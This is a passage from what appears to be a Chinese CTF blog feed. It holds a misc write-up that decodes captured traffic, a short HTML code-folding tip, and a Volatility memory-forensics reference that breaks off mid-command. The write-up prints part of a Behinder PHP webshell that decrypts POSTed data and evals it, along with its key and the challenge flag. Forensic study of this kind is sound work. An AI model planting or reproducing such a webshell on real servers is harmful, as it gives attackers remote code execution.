class="hljs-variable">$post</span>);<span class="hljs-variable">$i</span>++) &#123;<br>     <span class="hljs-variable">$post</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$post</span>[<span class="hljs-variable">$i</span>]^<span class="hljs-variable">$key</span>[<span class="hljs-variable">$i</span>+<span class="hljs-number">1</span>&amp;<span class="hljs-number">15</span>]; <br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-variable">$post</span>=<span class="hljs-title function_ invoke__">openssl_decrypt</span>(<span class="hljs-variable">$post</span>, <span class="hljs-string">&quot;AES128&quot;</span>, <span class="hljs-variable">$key</span>);<br>&#125;<br>    <span class="hljs-variable">$arr</span>=<span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-variable">$post</span>);<br>    <span class="hljs-variable">$func</span>=<span class="hljs-variable">$arr</span>[<span class="hljs-number">0</span>];<br>    <span class="hljs-variable">$params</span>=<span class="hljs-variable">$arr</span>[<span class="hljs-number">1</span>];<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span>&#123;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"><span class="hljs-variable">$p</span></span>) </span>&#123;<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$p</span>.<span class="hljs-string">&quot;&quot;</span>);&#125;&#125;<br>    @<span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">C</span>(),<span class="hljs-variable">$params</span>);<br><span class="hljs-meta">?&gt;</span><br><br>------WebKitFormBoundary906dOBUcjOE26LmB<br>Content-Disposition: form-data; name=<span class="hljs-string">&quot;submit&quot;</span><br><br>Submit<br>------WebKitFormBoundary906dOBUcjOE26LmB--<br><br></code></pre></td></tr></table></figure><p>果然是冰蝎，记录一下key是<code>e45e329feb5d925b</code></p><p>然后导出对象-html，一堆php，对里面的内容进行AES解密，再base64解密</p><p>得到password.png和flag.7z</p><p><img src="/2023/11/11/%E7%9C%81%E8%B5%9Bwp/download.png" alt="download"></p><p>赛后才知道是光栅</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br>img = np.array(Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.png&#x27;</span>))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>    z = np.zeros_like(img)<br>    z[:, i::<span class="hljs-number">5</span>, :] = img[:, i::<span class="hljs-number">5</span>, :]<br>    Image.fromarray(z).show()<br></code></pre></td></tr></table></figure><p>运行脚本看了四张图片得到密码<code>PPeRLR6SEmHGC</code></p><p>DASCTF{d68b6013-d70a-4ada-926d-68fe3265360a}</p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF-wp-Misc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>代码块折叠</title>
    <link href="/2023/11/10/%E4%BB%A3%E7%A0%81%E5%9D%97%E6%8A%98%E5%8F%A0/"/>
    <url>/2023/11/10/%E4%BB%A3%E7%A0%81%E5%9D%97%E6%8A%98%E5%8F%A0/</url>
    
    <content type="html"><![CDATA[<details><summary>fold name</summary><pre><code class="hljs">content</code></pre></details><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">源码<br><span class="hljs-variable">&lt;details&gt;</span><span class="hljs-variable">&lt;summary&gt;</span>fold name<span class="hljs-variable">&lt;/summary&gt;</span><span class="hljs-comment">##中间输入标题</span><br><span class="hljs-variable">&lt;pre&gt;</span><span class="hljs-variable">&lt;code&gt;</span>content<span class="hljs-comment">##这里输入要输的命令，不能有空格</span><br><span class="hljs-variable">&lt;/code&gt;</span><span class="hljs-variable">&lt;/pre&gt;</span><span class="hljs-variable">&lt;/details&gt;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>volatility的用法</title>
    <link href="/2023/11/09/volatility%E7%9A%84%E7%94%A8%E6%B3%95/"/>
    <url>/2023/11/09/volatility%E7%9A%84%E7%94%A8%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h3 id="Tools-introduction"><a href="#Tools-introduction" class="headerlink" title="Tools introduction"></a>Tools introduction</h3><h6 id="查看帮助"><a href="#查看帮助" class="headerlink" title="查看帮助"></a>查看帮助</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python2 vol.py -h<br></code></pre></td></tr></table></figure><details><summary>Result</summary><pre><code class="hljs">Volatility Foundation Volatility Framework 2.6用法： Volatility - 内存取证分析平台Options:  -h, --help            列出所有可用选项及其默认值                        默认值可以在配置文件中设置                        (/etc/volatilityrc)  --conf-file=/home/kali/.volatilityrc                        基于用户的配置文件  -d, --debug           调试Volatility  --plugins=PLUGINS     要使用的其他插件目录（冒号分隔）  --info                打印所有注册对象的信息  --cache-directory=/home/kali/.cache/volatility                        存放缓存文件的目录  --cache               使用缓存  --tz=TZ               设置 (Olson) 时区以使用 pytz（如果已安装）或 tzset 显示时间戳  -f FILENAME, --filename=FILENAME                        打开图像时使用的文件名  --profile=WinXPSP2x86                        要加载的配置文件的名称（使用 --info 查看支持的配置文件列表）  -l LOCATION, --location=LOCATION                        从中加载地址空间的 URN 位置  -w, --write           启用写支持  --dtb=DTB             DTB 地址  --shift=SHIFT         Mac KASLR 移位地址  --output=text         以这种格式输出（支持特定于模块，请参阅下面的模块输出选项）  --output-file=OUTPUT_FILE                        在此文件中写入输出  -v, --verbose         详细信息  -g KDBG, --kdbg=KDBG  指定一个 KDBG 虚拟地址（注意：对于 64 位 Windows 8 及更高版本，这是 KdCopyDataBlock 的地址）  --force               强制使用可疑配置文件  -k KPCR, --kpcr=KPCR  指定特定的 KPCR 地址  --cookie=COOKIE       指定 nt!ObHeaderCookie 的地址（仅适用于 Windows 10）    支持的插件命令:        amcache        查看AmCache应用程序痕迹信息        apihooks       检测内核及进程的内存空间中的API hook        atoms          列出会话及窗口站atom表        atomscan       Atom表的池扫描(Pool scanner)        auditpol       列出注册表HKLMSECURITYPolicyPolAdtEv的审计策略信息        bigpools       使用BigPagePoolScanner转储大分页池(big page pools)        bioskbd        从实时模式内存中读取键盘缓冲数据(早期电脑可以读取出BIOS开机密码)        cachedump      获取内存中缓存的域帐号的密码哈希        callbacks      打印全系统通知例程        clipboard      提取Windows剪贴板中的内容        cmdline        显示进程命令行参数        cmdscan        提取执行的命令行历史记录（扫描_COMMAND_HISTORY信息）        connections    打印系统打开的网络连接(仅支持Windows XP 和2003)        connscan       打印TCP连接信息        consoles       提取执行的命令行历史记录（扫描_CONSOLE_INFORMATION信息）        crashinfo      提取崩溃转储信息        deskscan       tagDESKTOP池扫描(Poolscaner)        devicetree     显示设备树信息        dlldump        从进程地址空间转储动态链接库        dlllist        打印每个进程加载的动态链接库列表        driverirp      IRP hook驱动检测        drivermodule   关联驱动对象至内核模块        driverscan     驱动对象池扫描        dumpcerts      提取RAS私钥及SSL公钥        dumpfiles      提取内存中映射或缓存的文件        dumpregistry   转储内存中注册表信息至磁盘        editbox        查看Edit编辑控件信息 (Listbox正在实验中)        envars         显示进程的环境变量        eventhooks     打印Windows事件hook详细信息        evtlogs        提取Windows事件日志（仅支持XP/2003)        filescan       提取文件对象（file objects）池信息        gahti          转储用户句柄（handle）类型信息        gditimers      打印已安装的GDI计时器(timers)及回调(callbacks)        gdt            显示全局描述符表(Global Deor Table)        getservicesids 获取注册表中的服务名称并返回SID信息        getsids        打印每个进程的SID信息        handles        打印每个进程打开的句柄的列表        hashdump       转储内存中的Windows帐户密码哈希(LM/NTLM)        hibinfo        转储休眠文件信息        hivedump       打印注册表配置单元信息        hivelist       打印注册表配置单元列表        hivescan       注册表配置单元池扫描        hpakextract    从HPAK文件（Fast Dump格式）提取物理内存数据        hpakinfo       查看HPAK文件属性及相关信息        idt            显示中断描述符表(Interrupt Deor Table)        iehistory      重建IE缓存及访问历史记录        imagecopy      将物理地址空间导出原生DD镜像文件        imageinfo      查看/识别镜像信息        impscan        扫描对导入函数的调用        joblinks       打印进程任务链接信息        kdbgscan       搜索和转储潜在KDBG值        kpcrscan       搜索和转储潜在KPCR值        ldrmodules     检测未链接的动态链接DLL        lsadump        从注册表中提取LSA密钥信息（已解密）        machoinfo      转储Mach-O 文件格式信息        malfind        查找隐藏的和插入的代码        mbrparser      扫描并解析潜在的主引导记录(MBR)        memdump        转储进程的可寻址内存        memmap         打印内存映射        messagehooks   桌面和窗口消息钩子的线程列表        mftparser      扫描并解析潜在的MFT条目        moddump        转储内核驱动程序到可执行文件的示例        modscan        内核模块池扫描        modules        打印加载模块的列表        multiscan      批量扫描各种对象        mutantscan     对互斥对象池扫描        notepad        查看记事本当前显示的文本        objtypescan    扫描窗口对象类型对象        patcher        基于页面扫描的补丁程序内存        poolpeek       可配置的池扫描器插件        printkey       打印注册表项及其子项和值        privs          显示进程权限        procdump       进程转储到一个可执行文件示例        pslist         按照EPROCESS列表打印所有正在运行的进程        psscan         进程对象池扫描        pstree         以树型方式打印进程列表        psxview        查找带有隐藏进程的所有进程列表        qemuinfo       转储 Qemu 信息        raw2dmp        将物理内存原生数据转换为windbg崩溃转储格式        screenshot     基于GDI Windows的虚拟屏幕截图保存        servicediff    Windows服务列表(ala Plugx)        sessions       _MM_SESSION_SPACE的详细信息列表(用户登录会话)        shellbags      打印Shellbags信息        shimcache      解析应用程序兼容性Shim缓存注册表项        shutdowntime   从内存中的注册表信息获取机器关机时间        sockets        打印已打开套接字列表        sockscan       TCP套接字对象池扫描        ssdt           显示SSDT条目        strings        物理到虚拟地址的偏移匹配(需要一些时间，带详细信息)        svcscan        Windows服务列表扫描        symlinkscan    符号链接对象池扫描        thrdscan       线程对象池扫描        threads        调查_ETHREAD 和_KTHREADs        timeliner      创建内存中的各种痕迹信息的时间线        timers         打印内核计时器及关联模块的DPC        truecryptmasterRecover 恢复TrueCrypt 7.1a主密钥        truecryptpassphrase查找并提取TrueCrypt密码        truecryptsummaryTrueCrypt摘要信息        unloadedmodules打印卸载的模块信息列表        userassist     打印注册表中UserAssist相关信息        userhandles    转储用户句柄表        vaddump        转储VAD数据为文件        vadinfo        转储VAD信息        vadtree        以树形方式显示VAD树信息        vadwalk        显示遍历VAD树        vboxinfo       转储Virtualbox信息（虚拟机）        verinfo        打印PE镜像中的版本信息        vmwareinfo     转储VMware VMSS/VMSN 信息        volshell       内存镜像中的shell        windows        打印桌面窗口(详细信息)        wintree        Z顺序打印桌面窗口树        wndscan        池扫描窗口站        yarascan       以Yara签名扫描进程或内核内存</code></pre></details><h6 id="查看插件"><a href="#查看插件" class="headerlink" title="查看插件"></a>查看插件</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python2 vol.py --info<br></code></pre></td></tr></table></figure><details><summary>Result</summary><pre><code class="hljs">Volatility Foundation Volatility Framework 2.6-----------------------------------------------------------------------------------------Profiles--------VistaSP0x64           - Windows Vista SP0 x64 的配置文件VistaSP0x86           - Windows Vista SP0 x86 的配置文件VistaSP1x64           - Windows Vista SP1 x64 的配置文件VistaSP1x86           - Windows Vista SP1 x86 的配置文件VistaSP2x64           - Windows Vista SP1 x86 的配置文件VistaSP2x86           - Windows Vista SP2 x64 的配置文件 Win10x64              - Windows 10 x64 的配置文件 Win10x64_10586        - Windows 10 x64 的配置文件 (10.0.10586.306 / 2016-04-23)Win10x64_14393        - Windows 10 x64 的配置文件 (10.0.14393.0 / 2016-07-16)Win10x86              - Windows 10 x86 的配置文件Win10x86_10586        - Windows 10 x86 的配置文件 (10.0.10586.420 / 2016-05-28)Win10x86_14393        - Windows 10 x86 的配置文件 (10.0.14393.0 / 2016-07-16)Win2003SP0x86         - Windows 2003 SP0 x86 的配置文件Win2003SP1x64         - Windows 2003 SP0 x86 的配置文件Win2003SP1x86         - Windows 2003 SP1 x86 的配置文件 Win2003SP2x64         - Windows 2003 SP1 x86 的配置文件 Win2003SP2x86         - Windows 2003 SP2 x86 的配置文件 Win2008R2SP0x64       - Windows 2008 R2 SP0 x64 的配置文件Win2008R2SP1x64       - Windows 2008 R2 SP1 x64 的配置文件Win2008R2SP1x64_23418 - Windows 2008 R2 SP1 x64 的配置文件 (6.1.7601.23418 / 2016-04-09)Win2008SP1x64         - Windows 2008 SP1 x64 的配置文件Win2008SP1x86         - Windows 2008 SP1 x86 的配置文件Win2008SP2x64         - Windows 2008 SP2 x64 的配置文件Win2008SP2x86         - Windows 2008 SP2 x86 的配置文件Win2012R2x64          - Windows Server 2012 R2 x64 的配置文件Win2012R2x64_18340    - Windows Server 2012 R2 x64 的配置文件 (6.3.9600.18340 / 2016-05-13)Win2012x64            - Windows Server 2012 x64 的配置文件Win2016x64_14393      - Windows Server 2016 x64 的配置文件 (10.0.14393.0 / 2016-07-16)Win7SP0x64            - Windows 7 SP0 x64 的配置文件Win7SP0x86            - Windows 7 SP0 x86 的配置文件Win7SP1x64            - Windows 7 SP1 x64 的配置文件Win7SP1x64_23418      - Windows 7 SP1 x64 的配置文件 (6.1.7601.23418 / 2016-04-09)Win7SP1x86            - Windows 7 SP1 x86 的配置文件Win7SP1x86_23418      - Windows 7 SP1 x86 的配置文件 (6.1.7601.23418 / 2016-04-09)Win81U1x64            - Windows 8.1 更新 1 x64 的配置文件Win81U1x86            - Windows 8.1 更新 1 x86 的配置文件Win8SP0x64            - Windows 8 x64 的配置文件Win8SP0x86            - Windows 8 x86 的配置文件Win8SP1x64            - Windows 8.1 x64 的配置文件Win8SP1x64_18340      - Windows 8.1 x64 的配置文件 (6.3.9600.18340 / 2016-05-13)Win8SP1x86            - Windows 8.1 x86 的配置文件WinXPSP1x64           - Windows XP SP1 x64 的配置文件WinXPSP2x64           - Windows XP SP2 x64 的配置文件WinXPSP2x86           - Windows XP SP2 x86 的配置文件WinXPSP3x86           - Windows XP SP3 x86 的配置文件----------------------------------------------------------------------------------------Address Spaces--------------AMD64PagedMemory              - 标准 AMD 64 位地址空间ArmAddressSpace               - ARM 处理器的地址空间FileAddressSpace              - 这是一个直接文件 AS.HPAKAddressSpace              - 此 AS 支持 HPAK 格式IA32PagedMemory               - 标准 IA-32 分页地址空间IA32PagedMemoryPae            - 此类实现 IA-32 PAE 分页地址空间LimeAddressSpace              - Lime 的地址空间LinuxAMD64PagedMemory         - Linux 特定的 AMD 64 位地址空间MachOAddressSpace             - mach-o 文件的地址空间以支持 atc-ny 内存读取器OSXPmemELF                    - 这个 AS 支持 VirtualBox ELF64 coredump 格式QemuCoreDumpElf               - 这个 AS 支持 Qemu ELF32 和 ELF64 核心转储格式VMWareAddressSpace            - 此 AS 支持 VMware 快照 (VMSS) 和保存状态 (VMSS) 文件 VMWareMetaAddressSpace        - 此 AS 支持带有 VMSN/VMSS 元数据的 VMEM 格式 VirtualBoxCoreDumpElf64       - 这个 AS 支持 VirtualBox ELF64 coredump 格式Win10AMD64PagedMemory         - Windows 10 特定的 AMD 64 位地址空间WindowsAMD64PagedMemory       - Windows 特定的 AMD 64 位地址空间WindowsCrashDumpSpace32       - 这个 AS 支持 windows 崩溃转储格式WindowsCrashDumpSpace64       - 此 AS 支持 windows Crash Dump 格式WindowsCrashDumpSpace64BitMap - 此 AS 支持 Windows BitMap Crash Dump 格式WindowsHiberFileSpace32       - 这是 Windows 休眠文件的休眠地址空间----------------------------------------------------------------------------------------Plugins-------amcache                    - 打印 AmCache 信息 apihooks                   - 检测进程和内核内存中的 API 挂钩 atoms                      - 打印会话和窗口站原子表atomscan                   - 原子表的池扫描器auditpol                   - 从 HKLM\SECURITY\Policy\PolAdtEv 打印出审计策略 bigpools                   - 使用 BigPagePoolScanner 转储大页面池 bioskbd                    - 从实模式内存中读取键盘缓冲区cachedump                  - 从内存中转储缓存的域哈希callbacks                  - 打印系统范围的通知例程clipboard                  - 提取 Windows 剪贴板的内容cmdline                    - 显示进程命令行参数cmdscan                    - 通过扫描 _COMMAND_HISTORY 来提取命令历史记录connections                - 打印打开的连接列表 [仅限 Windows XP 和 2003]connscan                   - 用于 tcp 连接的池扫描器consoles                   - 通过扫描 _CONSOLE_INFORMATION 提取命令历史记录crashinfo                  - 转储崩溃转储信息deskscan                   - tagDESKTOP（台式机）的 Poolscanerdevicetree                 - 显示设备树dlldump                    - 从进程地址空间转储 DLLdlllist                    - 打印每个进程加载的 dll 列表driverirp                  - 驱动程序 IRP 挂钩检测drivermodule               - 将驱动程序对象关联到内核模块driverscan                 - 驱动程序对象的池扫描器dumpcerts                  - 转储 RSA 私有和公共 SSL 密钥dumpfiles                  - 提取内存映射和缓存文件dumpregistry               - 将注册表文件转储到磁盘editbox                    - 显示有关编辑控件的信息（列表框实验）envars                     - 显示进程环境变量eventhooks                 - 在 Windows 事件挂钩上打印详细信息evtlogs                    - 提取 Windows 事件日志（仅限 XP/2003）filescan                   - 文件对象的池扫描器gahti                      - 转储 USER 句柄类型信息gditimers                  - 打印已安装的 GDI 计时器和回调gdt                        - 显示全局描述符表getservicesids             - 获取 Registry 中的服务名称并返回计算的 SIDgetsids                    - 打印拥有每个进程的 SIDhandles                    - 打印每个进程的打开句柄列表hashdump                   - 从内存中转储密码哈希 (LM/NTLM)hibinfo                    - 转储休眠文件信息hivedump                   - 打印注册表hivelist                   - 打印注册表配置单元列表hivescan                   - 注册表配置单元的池扫描程序hpakextract                - 从 HPAK 文件中提取物理内存 hpakinfo                   - 有关 HPAK 文件的信息 idt                        - 显示中断描述符表 iehistory                  - 重建 Internet Explorer 缓存/历史 imagecopy                  - 将物理地址空间复制为原始 DD 映像imageinfo                  - 识别图像的信息 impscan                    - 扫描对导入函数的调用joblinks                   - 打印进程作业链接信息 kdbgscan                   - 搜索和转储潜在的 KDBG 值 kpcrscan                   - 搜索和转储潜在的 KPCR 值ldrmodules                 - 检测未链接的 DLL limeinfo                   - 转储 Lime 文件格式信息linux_apihooks             - 检查用户态 apihooks linux_arp                  - 打印 ARP 表 linux_aslr_shift           - 自动检测 Linux ASLR shift linux_banner               - 打印 Linux 横幅信息linux_bash                 - 从 bash 进程内存中恢复 bash 历史记录linux_bash_env             - 恢复进程的动态环境变量linux_bash_hash            - 从 bash 进程内存中恢复 bash 哈希表 linux_check_afinfo         - 验证网络协议的操作函数指针linux_check_creds          - 检查是否有进程共享凭证结构linux_check_evt_arm        - 检查异常向量表以查找系统调用表挂钩 linux_check_fop            - 检查 rootkit 修改的文件操作结构linux_check_idt            - 检查 IDT 是否已被更改linux_check_inline_kernel  - 检查内联内核挂钩linux_check_modules        - 将模块列表与 sysfs 信息进行比较（如果可用）linux_check_syscall        - 检查系统调用表是否已更改linux_check_syscall_arm    - 检查系统调用表是否已更改linux_check_tty            - 检查 tty 设备的钩子linux_cpuinfo              - 打印每个活动处理器的信息 linux_dentry_cache         - 从 dentry 缓存中收集文件 linux_dmesg                - 收集 dmesg 缓冲区linux_dump_map             - 将选定的内存映射写入磁盘linux_dynamic_env          - 恢复进程的动态环境变量linux_elfs                 - 在进程映射中查找 ELF 二进制文件 linux_enumerate_files      - 列出文件系统缓存引用的文件 linux_find_file            - 列出并从内存中恢复文件 linux_getcwd               - 列出每个进程的当前工作目录 linux_hidden_modules       - 雕刻内存以查找隐藏的内核模块 linux_ifconfig             - 收集活动接口 linux_info_regs            - 就像 GDB 中的“信息寄存器”。 它打印出所有linux_iomem                - 提供类似于 /proc/iomem 的输出linux_kernel_opened_files  - 列出从内核中打开的文件 linux_keyboard_notifiers   - 解析键盘通知器调用链 linux_ldrmodules           - 将 proc 映射的输出与 libdl 中的库列表进行比较linux_library_list         - 列出加载到进程中的库 linux_librarydump          - 将进程内存中的共享库转储到磁盘 linux_list_raw             - 列出具有混杂套接字的应用程序 linux_lsmod                - 收集加载的内核模块 linux_lsof                 - 列出文件描述符及其路径 linux_malfind              - 寻找可疑的进程映射 linux_memmap               - 转储 linux 任务的内存映射 linux_moddump              - 提取加载的内核模块 linux_mount                - 收集挂载的 fs/deviceslinux_mount_cache          - 从 kmem_cache收集挂载的 fs/deviceslinux_netfilter            - 列出 Netfilter 钩子linux_netscan              - 雕刻网络连接结构 linux_netstat              - 列出打开的套接字 linux_pidhashtable         - 通过 PID 哈希表枚举进程 linux_pkt_queues           - 将每个进程的数据包队列写入磁盘linux_plthook              - 扫描 ELF 二进制文件的 PLT 以获取非需要图像的挂钩linux_proc_maps            - 收集进程内存映射 linux_proc_maps_rb         - 通过映射红黑树为 linux 收集进程映射linux_procdump             - 将进程的可执行映像转储到磁盘 linux_process_hollow       - 检查进程空心的迹象 linux_psaux                - 收集进程以及完整的命令行和开始时间 linux_psenv                - 收集进程及其静态环境变量 linux_pslist               - 通过遍历 task_struct->task 列表来收集活动任务linux_pslist_cache         - 从 kmem_cache 收集任务linux_psscan               - 扫描进程的物理内存linux_pstree               - 显示进程之间的父/子关系linux_psxview              - 使用各种进程列表查找隐藏进程linux_recover_filesystem   - 从内存中恢复整个缓存文件系统linux_route_cache          - 从内存中恢复路由缓存 linux_sk_buff_cache        - 从 sk_buff kmem_cache 中恢复数据包linux_slabinfo             - 在运行的机器上模拟 /proc/slabinfolinux_strings              - 将物理偏移量与虚拟地址匹配（可能需要一段时间，非常冗长）linux_threads              - 打印进程的线程 linux_tmpfs                - 从内存中恢复 tmpfs 文件系统linux_truecrypt_passphrase - 恢复缓存的 Truecrypt 密码linux_vma_cache            - 从 vm_area_struct 缓存中收集 VMA linux_volshell             - 内存映像中的 Shell linux_yarascan             - Linux 内存映像中的 shelllsadump                    - 从注册表中转储（解密的）LSA 机密mac_adium                  - 列出 Adium 消息mac_apihooks               - 检查进程中的 API 挂钩mac_apihooks_kernel        - 检查系统调用和内核函数是否被挂钩 mac_arp                    - 打印 arp 表mac_bash                   - 从 bash 进程内存中恢复 bash 历史记录mac_bash_env               - 恢复 bash 的环境变量mac_bash_hash              - 从 bash 进程内存中恢复 bash 哈希表mac_calendar               - 从 Calendar.app 获取日历事件mac_check_fop              - 验证文件操作指针 mac_check_mig_table        - 列出内核 MIG 表中的整体mac_check_syscall_shadow   - 查找影子系统调用表 mac_check_syscalls         - 检查系统调用表条目是否被挂钩 mac_check_sysctl           - 检查未知的 sysctl 处理程序mac_check_trap_table       - 检查 mach 陷阱表条目是否被钩住mac_compressed_swap        - 打印 Mac OS X VM 压缩器统计数据并转储所有压缩页面mac_contacts               - 从 Contacts.app 获取联系人姓名 mac_dead_procs             - 打印终止/取消分配的进程mac_dead_sockets           - 打印终止/取消分配的网络套接字mac_dead_vnodes            - 列出释放的 vnode 结构mac_devfs                  - 列出文件缓存中的文件 mac_dmesg                  - 打印内核调试缓冲区 mac_dump_file              - 转储指定文件 mac_dump_maps              - 转储进程的内存范围，可选地包括压缩交换中的页面 mac_dyld_maps              - 从 dyld 数据结构中获取进程的内存映射mac_find_aslr_shift        - 查找 10.8+ 图像的 ASLR 移位值mac_get_profile            - 自动检测 Mac 配置文件mac_ifconfig               - 列出所有设备的网络接口信息 mac_interest_handlers      - 列出 IOKit 兴趣处理程序 mac_ip_filters             - 报告任何挂钩的 IP 过滤器mac_kernel_classes         - 列出内核中加载的 c++ 类mac_kevents                - 显示进程的父/子关系mac_keychaindump           - 恢复可能的钥匙串密钥。 使用chainbreaker打开相关的keychain文件mac_ldrmodules             - 将 proc 映射的输出与 libdl 中的库列表进行比较mac_librarydump            - 转储进程的可执行文件 mac_list_files             - 列出文件缓存中的文件 mac_list_kauth_listeners   - 列出 Kauth Scope 监听器 mac_list_kauth_scopes      - 列出 Kauth 范围及其状态mac_list_raw               - 列出具有混杂套接字的应用程序 mac_list_sessions          - 枚举会话 mac_list_zones             - 打印活动区域 mac_lsmod                  - 列出加载的内核模块 mac_lsmod_iokit            - 列出通过 IOkit 加载的内核模块mac_lsmod_kext_map         - 列出加载的内核模块 mac_lsof                   - 列出每个进程打开的文件 mac_machine_info           - 打印有关样本的机器信息 mac_malfind                - 寻找可疑的进程映射 mac_memdump                - 将可寻址内存页转储到文件中 mac_moddump                - 将指定的内核扩展写入磁盘 mac_mount                  - 打印挂载的设备信息 mac_netstat                - 列出每个进程的活动网络连接 mac_network_conns          - 列出来自内核网络结构的网络连接 mac_notesapp               - 查找 Notes 消息的内容mac_notifiers              - 检测将钩子添加到 I/O 工具包中的 rootkit（例如 LogKext）mac_orphan_threads         - 列出不映射回已知模块/进程的线程mac_pgrp_hash_table        - 遍历进程组哈希表 mac_pid_hash_table         - 遍历 pid 哈希表mac_print_boot_cmdline     - 打印内核启动参数 mac_proc_maps              - 获取进程的内存映射 mac_procdump               - 转储进程的可执行文件 mac_psaux                  - 在用户区打印带有参数的进程 (**argv)mac_psenv                  - 在用户空间打印带有环境的进程 (**envp)mac_pslist                 - 列出正在运行的进程 mac_pstree                 - 显示进程的父/子关系mac_psxview                - 使用各种进程列表查找隐藏进程 mac_recover_filesystem     - 恢复缓存的文件系统 mac_route                  - 打印路由表 mac_socket_filters         - 报告套接字过滤器 mac_strings                - 将物理偏移量与虚拟地址匹配（可能需要一段时间，非常冗长）mac_tasks                  - 列出活动任务 mac_threads                - 列出进程线程 mac_threads_simple         - 列出线程及其开始时间和优先级 mac_timers                 - 报告内核驱动程序设置的定时器 mac_trustedbsd             - 列出恶意的trustedbsd 策略mac_version                - 打印 Mac 版本mac_vfsevents              - 列出过滤文件系统事件的进程 mac_volshell               - 内存映像中的外壳 mac_yarascan               - 扫描内存中的 yara 签名 machoinfo                  - 转储 Mach-O 文件格式信息malfind                    - 查找隐藏和注入的代码 mbrparser                  - 扫描并解析潜在的主引导记录 (MBR)memdump                    - 转储进程的可寻址内存 memmap                     - 打印内存映射 messagehooks               - 列出桌面和线程窗口消息挂钩 mftparser                  - 扫描并解析潜在的 MFT 条目moddump                    - 将内核驱动程序转储到可执行文件示例 modscan                    - 内核模块的池扫描器 modules                    - 打印加载模块的列表 multiscan                  - 一次扫描各种对象 mutantscan                 - 互斥对象的池扫描器 netscan                    - 扫描 Vista（或更高版本）图像的连接和套接字 notepad                    - 列出当前显示的记事本文本 objtypescan                - 扫描 Windows 对象类型对象patcher                    - 基于页面扫描修补内存 poolpeek                   - 可配置的池扫描器插件 pooltracker                - 显示池标签使用的摘要 printkey                   - 打印注册表项及其子项和值 privs                      - 显示进程权限 procdump                   - 将进程转储到可执行文件示例 pslist                     - 按照 EPROCESS 列表打印所有正在运行的进程psscan                     - 进程对象的池扫描器 pstree                     - 将进程列表打印为树 psxview                    - 使用各种进程列表查找隐藏进程 qemuinfo                   - 转储 Qemu 信息raw2dmp                    - 将物理内存样本转换为 windbg 故障转储screenshot                 - 保存基于 GDI 窗口的伪截图servicediff                - 列出 Windows 服务（ala Plugx）sessions                   - 列出 _MM_SESSION_SPACE 的详细信息（用户登录会话）shellbags                  - 打印 ShellBags 信息shimcache                  - 解析应用程序兼容性 Shim Cache 注册表项shutdowntime               - 从注册表打印机器的 ShutdownTimesockets                    - 打印打开的套接字列表 sockscan                   - tcp 套接字对象的池扫描器ssdt                       - 显示 SSDT 条目strings                    - 将物理偏移量与虚拟地址匹配（可能需要一段时间，非常冗长）svcscan                    - 扫描 Windows 服务symlinkscan                - 符号链接对象的池扫描器 thrdscan                   - 线程对象的池扫描器 threads                    - 调查 _ETHREAD 和 _KTHREADstimeliner                  - 从内存中的各种工件创建时间线 timers                     - 打印内核定时器和相关的模块 DPCtruecryptmaster            - 恢复 TrueCrypt 7.1a 主密钥truecryptpassphrase        - TrueCrypt 缓存密码短语查找器truecryptsummary           - TrueCrypt 总结unloadedmodules            - 打印已卸载模块的列表 userassist                 - 打印 userassist 注册表项和信息userhandles                - 转储 USER 句柄表vaddump                    - 将 vad 部分转储到文件中vadinfo                    - 转储 VAD 信息vadtree                    - 遍历 VAD 树并以树格式显示vadwalk                    - 走 VAD 树vboxinfo                   - 转储 virtualbox 信息 verinfo                    - 从 PE 图像中打印出版本信息vmwareinfo                 - 转储 VMware VMSS/VMSN 信息volshell                   - 内存映像中的 Shellwin10cookie                - 查找 Windows 10 的 ObHeaderCookie 值 windows                    - 打印桌面窗口（详细信息）wintree                    - 打印Z顺序桌面Windows树wndscan                    - 用于窗口站的池扫描仪yarascan                   - 使用 Yara 签名扫描进程或内核内存----------------------------------------------------------------------------------------Scanner Checks--------------CheckPoolSize          - 检查池块大小CheckPoolType          - 检查池类型KPCRScannerCheck       - 检查自引用指针以查找KPCRMultiPrefixFinderCheck - 每页检查多个字符串，在偏移处完成MultiStringFinderCheck - 每页检查多个字符串PoolTagCheck           - 此扫描程序检查池标记的出现</code></pre></details><h3 id="Command-format"><a href="#Command-format" class="headerlink" title="Command format"></a>Command format</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python2 vol<span class="hljs-selector-class">.py</span> -f <span class="hljs-selector-attr">[image]</span> <span class="hljs-attr">--profile</span>=<span class="hljs-selector-attr">[profile]</span> <span class="hljs-selector-attr">[plugin]</span><br>python2 vol<span class="hljs-selector-class">.py</span> -f <span class="hljs-selector-attr">[对象]</span> <span 